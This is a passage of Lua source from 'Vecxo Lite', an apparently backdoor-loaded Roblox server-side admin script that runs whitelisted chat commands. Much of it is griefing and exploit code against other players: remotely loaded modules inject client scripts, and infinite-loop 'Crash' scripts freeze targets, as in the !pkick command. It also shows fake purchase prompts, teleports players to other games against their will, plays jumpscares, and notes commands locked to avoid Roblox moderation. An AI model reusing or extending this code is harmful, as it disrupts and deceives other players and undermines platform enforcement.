	if not AntiKillConnections[player] then
		AntiKillConnections[player] = {}
	end
	AntiKillConnections[player].CharacterAdded = charAddedConnection
end

local function cleanupPlayerConnections(player)
	if AntiKillConnections[player] then
		if AntiKillConnections[player].CharacterAdded then
			AntiKillConnections[player].CharacterAdded:Disconnect()
		end
		for character, connections in pairs(AntiKillConnections[player]) do
			if character ~= "CharacterAdded" and connections then
				for _, connection in pairs(connections) do
					if connection and connection.Connected then
						connection:Disconnect()
					end
				end
			end
		end
		AntiKillConnections[player] = nil
	end
end

function start()
	local a = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
	--[[local r = Instance.new("RemoteEvent", a)
	r.Name = "cxo's gmod remote"]]

	if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
		local ticking = tick()
		require(gamegoog).load() -- goog readder
		repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
	end

	local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

	if not goog then
		warn("goog failed to be added, command can not continue")
		return
	end

	local scr = goog:FindFirstChild("Utilities").Client:Clone()
	local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

	loa.Parent = scr
	scr:WaitForChild("Exec").Value = [[
		
	local r = game:GetService("ReplicatedStorage")
	local remote = r:WaitForChild("cxo's folder"):WaitForChild("cxo's gmod remote")
	local UserInputService = game:GetService("UserInputService")
	local Mouse = game.Players.LocalPlayer:GetMouse()

	local selected = nil
	local isgrabbed = false

	local function pickup(target)
		if target and target:IsA("BasePart") and target.Anchored == false and not isgrabbed then
			isgrabbed = true
			selected = target
			remote:FireServer("Pickup", selected)
		end
	end

	local function update(pos)
		if selected and isgrabbed then
			remote:FireServer("Update", pos)
		end
	end

	local function release()
		if selected then
			isgrabbed = false
			selected = nil
			remote:FireServer("Release")
		end
	end

	Mouse.Button1Down:Connect(function()
		local target = Mouse.Target
		pickup(target)
	end)

	Mouse.Move:Connect(function()
		if selected and isgrabbed then
			local pos = Mouse.Hit.p
			update(pos)
		end
	end)

	Mouse.Button1Up:Connect(function()
		release()
	end)

	UserInputService.TouchStarted:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.Touch then
			local target = workspace:FindPartOnRayWithIgnoreList(workspace.CurrentCamera:ScreenPointToRay(input.Position.X, input.Position.Y), {game.Players.LocalPlayer.Character})
			pickup(target)
		end
	end)

	UserInputService.TouchMoved:Connect(function(input)
		if selected and isgrabbed then
			local touchpos = input.Position
			local ray = workspace.CurrentCamera:ScreenPointToRay(touchpos.X, touchpos.Y)
			local touchpos = ray.Origin + ray.Direction * 50
			update(touchpos)
		end
	end)

	UserInputService.TouchEnded:Connect(function(input)
		release()
	end)

	]]

	scr.Parent = a
	scr.Name = "RemoteScript"
	scr.Enabled = true

	if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
		local ticking = tick()
		require(gamegoog).load() -- goog readder
		repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
	end

	local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

	if not goog then
		warn("goog failed to be added, command can not continue")
		return
	end

	local scr = goog:FindFirstChild("Utilities").Client:Clone()
	local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

	loa.Parent = scr
	scr:WaitForChild("Exec").Value = [[
		
	while true do end

	]]
	scr.Parent = a
	scr.Name = "Crash"
	scr.Enabled = true
end

vecxoconnections["RemovedFuncs"] = game:GetService("ReplicatedStorage").ChildRemoved:Connect(function(t)
	if t.Name == "cxo's folder" then
		local a = Instance.new("Folder", game:GetService("ReplicatedStorage"))
		a.Name = "cxo's folder"

		task.wait(0.25)
		if not a:FindFirstChild("OrbScript") and not a:FindFirstChild("cxo's gmod remote") then
			local r = Instance.new("RemoteEvent", a)
			r.Name = "cxo's gmod remote"

			vecxoconnections["Gmod"]()

			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
			local r = game:GetService("ReplicatedStorage")
			local remote = r:WaitForChild("cxo's gmod remote")
			local UserInputService = game:GetService("UserInputService")
			local Mouse = game.Players.LocalPlayer:GetMouse()

			local selected = nil
			local isgrabbed = false

			local function pickup(target)
				if target and target:IsA("BasePart") and target.Anchored == false and not isgrabbed then
					isgrabbed = true
					selected = target
					remote:FireServer("Pickup", selected)
				end
			end

			local function update(pos)
				if selected and isgrabbed then
					remote:FireServer("Update", pos)
				end
			end

			local function release()
				if selected then
					isgrabbed = false
					selected = nil
					remote:FireServer("Release")
				end
			end

			Mouse.Button1Down:Connect(function()
				local target = Mouse.Target
				pickup(target)
			end)

			Mouse.Move:Connect(function()
				if selected and isgrabbed then
					local pos = Mouse.Hit.p
					update(pos)
				end
			end)

			Mouse.Button1Up:Connect(function()
				release()
			end)

			UserInputService.TouchStarted:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.Touch then
					local target = workspace:FindPartOnRayWithIgnoreList(workspace.CurrentCamera:ScreenPointToRay(input.Position.X, input.Position.Y), {game.Players.LocalPlayer.Character})
					pickup(target)
				end
			end)

			UserInputService.TouchMoved:Connect(function(input)
				if selected and isgrabbed then
					local touchpos = input.Position
					local ray = workspace.CurrentCamera:ScreenPointToRay(touchpos.X, touchpos.Y)
					local touchpos = ray.Origin + ray.Direction * 50
					update(touchpos)
				end
			end)

			UserInputService.TouchEnded:Connect(function(input)
				release()
			end)

			]]
			scr.Parent = a
			scr.Name = "RemoteScript"
			scr.Enabled = true

			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				while true do end

			]]
			scr.Parent = a
			scr.Name = "Crash"
			scr.Enabled = true

			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				local sound = Instance.new("Sound", workspace)
				sound.SoundId = "rbxassetid://17518855592"
				sound.TimePosition = 1.7
				sound.Volume = 10
				sound:Play()
				sound.Ended:Connect(function()
					sound:Destroy()
					script:Destroy()
				end)

			]]
			scr.Parent = a
			scr.Name = "JumpScareScript"
			scr.Enabled = true
		end
	end
end)

local function processCommand(sender, msg)
	if not table.find(whitelisted, tostring(sender.UserId)) then return end
	local currentToken = authTokens[sender]
	if not currentToken then
		notify(sender, "[Vecxo Lite]: ", "‚ùå Your current auth token for the command system does not match up with what is required, therefore the command was not sent")
		return
	end
	local function refreshToken(player)
		local newToken = generateToken()
		authTokens[player] = newToken
		TokenRemote:FireClient(player, newToken)
	end
	if table.find(whitelisted, tostring(sender.UserId)) then
		refreshToken(sender)
	end
	local args = msg:split(" ")
	local cmd = args[1]:lower()
	if not msg:match("^!") then
		return
	end
	local handled = false
	if cmd == "!wl" and args[2] then
		handled = true
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv3(sender, "[Vecxo Lite]", "‚ùå Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for i, targetPlayer in ipairs(targets) do
			if not table.find(whitelisted, tostring(targetPlayer.UserId)) then
				table.insert(whitelisted, tostring(targetPlayer.UserId))
				local token = generateToken()
				authTokens[targetPlayer] = token
				TokenRemote:FireClient(targetPlayer, token)
			else
				notify(sender, "[Vecxo Lite]:", "‚ùå " .. targetPlayer.Name .. " is already whitelisted.")
				return
			end
			task.spawn(function()
				GraphicalEffects.CrystalRing(targetPlayer, "Lime green", 2)
			end)
			notify(sender, "[Vecxo Lite]:", "‚úÖ Whitelisted " .. targetPlayer.Name)
			notifyv3(targetPlayer, "[Vecxo Lite]:", "‚úÖ You have been whitelisted. Usage: !cmds")
		end
	elseif cmd == "!antiexe" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Really red", 2)
			end)
			AntiExePlayers[plr] = true
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Anti-executor enabled for " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!cguis" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Really red", 2)
			end)
			if plr:FindFirstChild("PlayerGui") then
				local pg = plr.PlayerGui
				for _, gui in ipairs(pg:GetChildren()) do
					if gui:IsA("ScreenGui") then
						if gui.Name ~= "StarterGui" and gui.Name ~= "HealthGui" and gui.Name ~= "CoreGuiClone" then
							gui:Destroy()
						end
					end
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Cleared guis for " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players sucessfully"))
	elseif cmd == "!time" then
		handled = true
		local value = tonumber(args[2])
		if value then
			game:GetService("Lighting").TimeOfDay = tostring(value)
			notifyv3(sender, "[Vecxo Lite]: ", "‚è∞ Time set to "..value)
		else
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Invalid time value!")
		end
	elseif cmd == "!mapprotection" then
		handled = true
		local toggle = args[2] and args[2]:lower()
		if toggle == "true" then
			MapProtection = true
			task.spawn(function()
				while true do
					task.wait(0.02)
					if MapProtection then
						for fullName, originalObj in pairs(OriginalMap) do
							local currentObj = workspace:FindFirstChild(originalObj.Name, true)
							if not currentObj then
								local parent = workspace
								local path = string.split(originalObj:GetFullName(), ".")
								table.remove(path)
								for _, pName in ipairs(path) do
									parent = parent:FindFirstChild(pName) or parent
								end
								originalObj:Clone().Parent = parent
							else
								if currentObj:IsA("BasePart") then
									currentObj.CFrame = originalObj.CFrame
									currentObj.Size = originalObj.Size
									currentObj.Color = originalObj.Color
									currentObj.Material = originalObj.Material
									currentObj.Transparency = originalObj.Transparency
									currentObj.Anchored = originalObj.Anchored
									currentObj.CanCollide = originalObj.CanCollide
								end
							end
						end
					end
				end
			end)
			notifyv3(sender, "[Vecxo Lite]: ", "üõ° Map protection ENABLED")
		elseif toggle == "false" then
			MapProtection = false
			notifyv3(sender, "[Vecxo Lite]: ", "üõ° Map protection DISABLED")
		else
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Usage: !mapprotection <true/false>")
		end
	elseif cmd == "!bhop" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		if not dekBhop then
			dekBhop = require(138730865884801)
		end
		for _,plr in targets do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			dekBhop(plr)
		end
	elseif cmd == "!baseplate" then
		handled = true
		local baseplate = Instance.new("Part")
		baseplate.Name = "Baseplate"
		baseplate.Size = Vector3.new(2048, 16, 2048)
		baseplate.Position = Vector3.new(0, -8, 0)
		baseplate.Anchored = true
		baseplate.Locked = true
		baseplate.BrickColor = BrickColor.new("Bright green")
		baseplate.Material = Enum.Material.Grass
		baseplate.TopSurface = Enum.SurfaceType.Smooth
		baseplate.BottomSurface = Enum.SurfaceType.Smooth
		baseplate.Parent = workspace
		local spawn = Instance.new("SpawnLocation")
		spawn.Name = "SpawnLocation"
		spawn.Size = Vector3.new(8, 0.5, 8)
		spawn.Position = Vector3.new(0, 8.25, 0)
		spawn.Anchored = true
		spawn.CanCollide = false
		spawn.Transparency = 0.5
		spawn.BrickColor = BrickColor.new("Bright blue")
		spawn.Material = Enum.Material.Neon
		spawn.Neutral = true
		spawn.AllowTeamChangeOnTouch = false
		spawn.Duration = 0
		spawn.Parent = workspace
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Large baseplate created successfully.")
	elseif cmd == "!antipunish" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			if AutoUnpunish[plr.Name] then
				notifyv3(sender, "[Vecxo Lite]:", "‚úÖ ".. plr.Name .. " already has antipunish enabled!")
			else
				task.spawn(function()
					GraphicalEffects.CrystalRing(plr, "Lime green", 2)
				end)
				AutoUnpunish[plr.Name] = true
				if vecxoconnections["AntiPunish3"] then
					vecxoconnections["AntiPunish3"](plr)
				end
				notifyv3(sender, "[Vecxo Lite]:", "‚úÖ Antipunish enabled for " .. plr.Name)
			end
		end
	elseif cmd == "!music" then
		handled = true
		local id = args[2]
		for _, s in ipairs(workspace:GetChildren()) do
			if s:IsA("Sound") then
				s:Stop()
				s:Destroy()
			end
		end
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://" .. id
		sound.Looped = true
		sound.Volume = 1
		sound.Parent = workspace
		sound:Play()
		notifyv3(sender, "[Vecxo Lite]:", "üéµ Now playing Sound ID - " ..id)
	elseif cmd == "!unantipunish" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			if AutoUnpunish[plr.Name] then
				task.spawn(function()
					GraphicalEffects.CrystalRing(plr, "Really red", 2)
				end)
				AutoUnpunish[plr.Name] = nil
				notifyv3(sender, "[Vecxo Lite]:", "‚úÖ Antipunish disabled for " .. plr.Name)
			else
				notifyv3(sender, "[Vecxo Lite]:",  "‚ùå ".. plr.Name .. " didn't have antipunish enabled.")
			end
		end
	elseif cmd == "!spleef" then
		handled = true
		local gridX = tonumber(args[2]) or 16
		local gridZ = tonumber(args[3]) or 16

		local tileSize = 6
		local arenaHeight = 60
		local arenaCenter = Vector3.new(0, arenaHeight, 0)
		local arenaModel = Instance.new("Model", workspace)
		arenaModel.Name = "SpleefArena"
		local tiles = {}
		for x = 0, gridX - 1 do
			for z = 0, gridZ - 1 do
				local tile = Instance.new("Part")
				tile.Size = Vector3.new(tileSize, 1, tileSize)
				tile.Position = arenaCenter + Vector3.new((x - gridX/2) * tileSize + tileSize/2, 0, (z - gridZ/2) * tileSize + tileSize/2)
				tile.Anchored = true
				tile.Color = Color3.fromRGB(255, 255, 255)
				tile.Name = "SpleefTile"
				tile.Parent = arenaModel
				table.insert(tiles, tile)
				local touched = false
				tile.Touched:Connect(function(hit)
					local plr = game.Players:GetPlayerFromCharacter(hit.Parent)
					if plr and not touched then
						touched = true
						tile.Color = Color3.fromRGB(255, 0, 0)
						task.wait(0.6)
						tile.Anchored = false
						tile.CanCollide = false
						task.wait(1)
						tile:Destroy()
					end
				end)
			end
		end
		local shuffledTiles = {}
		for i = 1, #tiles do table.insert(shuffledTiles, tiles[i]) end
		for i = #shuffledTiles, 2, -1 do
			local j = math.random(i)
			shuffledTiles[i], shuffledTiles[j] = shuffledTiles[j], shuffledTiles[i]
		end
		for count = 5, 1, -1 do
			for _, plr in ipairs(game.Players:GetPlayers()) do
				if plr:FindFirstChild("PlayerGui") then
					local msg = Instance.new("Message", plr.PlayerGui)
					msg.Text = "Spleef starts in " .. count
					task.delay(1, function() msg:Destroy() end)
				end
			end
			task.wait(1)
		end
		local plrs = game.Players:GetPlayers()
		for i, plr in ipairs(plrs) do
			local tile = shuffledTiles[i]
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and tile then
				plr.Character.HumanoidRootPart.CFrame = CFrame.new(tile.Position + Vector3.new(0, 8, 0))
			end
		end
	elseif cmd == "!fixcam" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				local lp = game.Players.LocalPlayer
				local ui = game:GetService("UserInputService")
				local contextActionService = game:GetService("ContextActionService")
				local runService = game:GetService("RunService")
				
				contextActionService:UnbindAction("ShoulderCameraSprint")
				runService:UnbindFromRenderStep("ShoulderCameraUpdate")
				contextActionService:UnbindAction("ShoulderCameraZoom")
				
				while true do
					task.wait()
					
					repeat
						runService.Heartbeat:Wait()
					until game.Workspace.CurrentCamera.CameraType == Enum.CameraType.Scriptable
				
					runService:UnbindFromRenderStep("ShoulderCameraUpdate")
					contextActionService:UnbindAction("ShoulderCameraZoom")
					contextActionService:UnbindAction("ShoulderCameraSprint")
				
					local weaponSystem = game:GetService("ReplicatedStorage"):FindFirstChild('WeaponsSystem')
					if not weaponSystem then
						return
					end
				
					for _, v in pairs(weaponSystem:GetDescendants()) do
						if v:IsA("Script") then
							v.Disabled = true
						end
						v:Destroy()
					end
				
					local weaponScript = lp.PlayerGui:FindFirstChild("ClientWeaponsScript")
					local weaponGui = lp.PlayerGui:FindFirstChild("WeaponsSystemGui")
					local clientWeaponScript = lp.PlayerScripts:FindFirstChild("ClientWeaponsScript")
				
					if weaponScript then
						weaponScript.Disabled = true
						weaponScript:Destroy()
					end
				
					if weaponGui then
						weaponGui:Destroy()
					end
				
					if clientWeaponScript then
						clientWeaponScript.Disabled = true
						clientWeaponScript:Destroy()
					end
				
					game:GetService("UserInputService").MouseBehavior = Enum.MouseBehavior.Default
					ui.MouseIconEnabled = true
					lp.CameraMaxZoomDistance = 400
					lp.CameraMinZoomDistance = 0.5
				
					local camera = game:GetService("Workspace"):FindFirstChild("Camera")
					if camera then
						camera.FieldOfView = 70
					end
				
					game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
					game.Workspace.CurrentCamera.CameraSubject = lp.Character.Humanoid
					lp.Character.Humanoid.AutoRotate = true
				end
			]]

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end
			scr.Enabled = true
		end
	elseif cmd == "!forceplace" then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			local id = args[3]
			if not id or id == "" then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You need to provide a game id!")
				return
			end
			if id == "1" then
				id = "100181602455094"
			end
			for _, plr in ipairs(targets) do
				local success, err = pcall(function()
					game:GetService("TeleportService"):Teleport(tonumber(id), plr)
				end)
				if not success then
					notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Failed to teleport " .. plr.Name .. " to " .. id .. " | " .. tostring(err))
				end
				task.spawn(function()
					task.wait(5)
					if game.Players:FindFirstChild(plr.Name) then
						notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Player failed to teleport, they might not be old enough to join the experience")
					end
				end)
			end
		end
	elseif cmd == "!info" then
		handled = true
		local playerCount = #game.Players:GetPlayers()
		local uptime = os.time() - startTime
		local serverCountry = "Unknown"
		local serverRegion = "Unknown"
		local HttpService = game:GetService("HttpService")
		if HttpService.HttpEnabled then
			local success, data = pcall(function()
				local response = HttpService:GetAsync("http://ip-api.com/json/")
				return HttpService:JSONDecode(response)
			end)
			if success and data then
				serverCountry = data.country or "Unknown"
				serverRegion = data.regionName or "Unknown"
			end
		end
		local info = "Version: "..version.."\n"..
			"Last Update: "..lastUpdate.."\n\n"..
			"Server Stats:\n"..
			"- Players: "..playerCount.."\n"..
			"- Uptime: "..math.floor(uptime/60).." minutes\n"..
			"- Location: "..serverRegion.." ("..serverCountry..")\n\n"..
			"Latest Script Updates:\n"..
			"+ Locked some CMDS to prevent roblox moderation\n"..
			"+ Lots of new commands"
		notify(sender, "[Vecxo Lite]: - Information", info, 20)
	elseif cmd == "!promptpurchase" and args[2] then
		handled = true
		local targets = GetPlayers(args[2], sender)

		local ItemIcon = args[3] or "550692424"
		local ItemPrice = args[4] or "100000"
		local ItemName = table.concat(args, " ", 5) or "ü•µüòà ADIDAS (NEW) ü§ëüëª"

		if ItemIcon:find("rbxassetid://") then
			ItemIcon = ItemIcon:gsub("rbxassetid://", "")
		end
		ItemPrice = tostring(ItemPrice):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", ""):gsub(",+$", "")

		for i, plr in ipairs(targets) do
			task.spawn(function()
				local s, f = pcall(function()
					require(122557225201037):PurchasePromptApp(plr.Name, ItemName, ItemPrice, ItemIcon, math.random(0,999))
				end)

				if f then
					notify(sender, "[Vecxo Lite]: ", "‚ùå Failed to load the fake purchaser: ".. f)
				end
			end)
		end
	elseif cmd == "!creeper" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, fail = pcall(function()
				require(4708818072).Oaeh(plr.Name)
			end)
			notify(plr, "[Vecxo Lite]: ", "Press G to explode.")
		end
	elseif cmd == "!pkick" and args[2] then
		handled = true
		local targets = GetPlayers(args[2], sender)
		if not _G.nanp or not _G.naned then
			require(115021406772544).r("","poto")
		end
		for i, plr in ipairs(targets) do
			if not plr.Character then
				plr:LoadCharacter()
			elseif plr.Character and not plr.Character:FindFirstChild("HumanoidRootPart") then
				plr:LoadCharacter()
			end

			if not sender.Character then
				sender:LoadCharacter()
			elseif sender.Character and not sender.Character:FindFirstChild("HumanoidRootPart") then
				sender:LoadCharacter()
			end

			if not _G.nanp then
				repeat
					task.wait()
				until _G.nanp or timeout >= 15
			end

			local begin = tick()

			_G.nanp(plr)

			if _G.naned and typeof(_G.naned) ~= "table" then -- incase sum1 nil's it
				_G.naned = {}
			end

			if _G.rworded and typeof(_G.rworded) ~= "table" then -- incase sum1 nil's it
				_G.rworded = {}
			end

			local rnpos = sender.Character.HumanoidRootPart.CFrame

			if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("HotPotato") then
				local success, gear = pcall(function()
					return game:GetService("InsertService"):LoadAsset(25741198)
				end)

				if success and gear then
					local potato = gear:FindFirstChildOfClass("Tool")
					if potato then
						potato:Clone().Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
						potato.Parent = sender.Backpack
						repeat task.wait() until potato.Parent == sender.Backpack or not game.Players:FindFirstChild(sender.Name)
						for i = 1,4 do
							potato:Clone().Parent = sender.Backpack
						end
					end
				end
			else
				for i = 1,5 do
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("HotPotato"):Clone().Parent = sender.Backpack
				end
			end

			plr.Character.HumanoidRootPart.Anchored = true
			local fortnitesus = true

			local co = coroutine.create(function()
				repeat
					sender.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(-1.5,0,2)
					task.wait()
				until fortnitesus == false
			end)

			coroutine.resume(co)

			local f = Instance.new("ForceField", plr.Character)
			local ff = Instance.new("ForceField", sender.Character)

			for i,v in pairs(sender.Backpack:GetChildren()) do
				if v:IsA("Tool") and v.Name == "HotPotato" then
					v.Parent = sender.Character
					v:Activate()
				end
			end

			repeat task.wait() until plr.Character:FindFirstChild("HotPotato")

			fortnitesus = false
			sender.Character.HumanoidRootPart.CFrame = rnpos
			ff:Destroy()

			for i,v in pairs(sender.Character:GetChildren()) do
				if v:IsA("Tool") and v.Name == "HotPotato" then
					v:Destroy()
				end
			end

			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				while true do end

			]]
			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end
			scr.Name = "Crash"
			scr.Enabled = true

			local timeout = tick()

			repeat task.wait() until table.find(_G.rworded, plr.Name) or tick() - timeout >= 5

			local ended = tick()
			local takentime = ended - begin
			local kicktime

			if takentime < 1 then
				kicktime = string.format("%.0fms", takentime * 1000)
			else
				kicktime = string.format("%.1fs", takentime)
			end
			for i,p in pairs(workspace:GetChildren()) do
				if p:IsA("Tool") and p.Name == "HotPotato" then
					p:Destroy()
				end
			end
			for i,p in pairs(plr.Character:GetChildren()) do
				if p:IsA("Tool") and p.Name == "HotPotato" then
					p:Destroy()
				end
			end
			local b = Instance.new("BillboardGui", plr.Character:WaitForChild("Head"))
			local t = Instance.new("TextLabel", b)
			b.Size = UDim2.new(0, 50, 0, 50)
			b.ExtentsOffset = Vector3.new(0, 7, 0)
			b.Name = "KICKED"
			t.Size = UDim2.new(0, 50, 0, 20)
			t.BackgroundTransparency = 1

			notify(sender, "[Vecxo Lite]: ", "Kicked ".. plr.Name .." in ".. kicktime)

			t.Text = "[ CRASHED ]\nin ".. kicktime
			t.TextSize = 25
			t.Font = Enum.Font.SourceSansBold
			t.TextColor3 = Color3.fromRGB(0, 255, 0)
			t.Name = "TEXT"
			t.Size = UDim2.new(0, t.TextBounds.X + 10, 0, t.TextBounds.Y + 10)
			b.Size = UDim2.new(0, t.TextBounds.X + 10, 0, t.TextBounds.Y + 10)
		end
	elseif cmd == "!antikill" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if not table.find(AutoRespawn, plr.Name) then
				task.spawn(function()
					GraphicalEffects.CrystalRing(plr, "Lime green", 2)
				end)
				table.insert(AutoRespawn, plr.Name)
				createAntiDeathProtection(plr)
			else
				notifyv3(sender, "[Vecxo Lite]:", "‚úÖ "..plr.Name .. " already has antikill enabled!")
			end
		end
	elseif cmd == "!unantikill" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if table.find(AutoRespawn, plr.Name) then
				task.spawn(function()
					GraphicalEffects.CrystalRing(plr, "Really red", 2)
				end)
				table.remove(AutoRespawn, table.find(AutoRespawn, plr.Name))
				cleanupPlayerConnections(plr)
			end
		end
	elseif cmd == "!kfc" then
		handled = true
		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("KFC") then
			local KFC = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("KFC"):Clone()
			KFC.Parent = workspace
			KFC.PrimaryPart = KFC:FindFirstChild("Union")
			KFC:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(18, 7.5, -15) * CFrame.Angles(0, math.rad(90), 0))
		end
		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("KFC") then
			local success, fail = pcall(function()
				require(87631077502363).load("KFC")
			end)
			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("KFC")
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("KFC"):Clone()
				building.PrimaryPart = building:FindFirstChild("Union")
				building.Parent = workspace
				building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(18, 7.5, -15) * CFrame.Angles(0, math.rad(90), 0))
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå KFC failed to load: ".. fail)
			end
		else
			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("KFC"):Clone()
			building.PrimaryPart = building:FindFirstChild("Union")
			building.Parent = workspace
			building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(18, 7.5, -15) * CFrame.Angles(0, math.rad(90), 0))
		end
	elseif cmd == "!711" then
		handled = true
		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("7-11") then
			local seveneleven = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("7-11"):Clone()
			seveneleven.Parent = workspace
			seveneleven.PrimaryPart = seveneleven:FindFirstChild("Door"):FindFirstChild("Left"):FindFirstChild("Part")
			seveneleven:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(-1.5, 0.5, -3))
		end

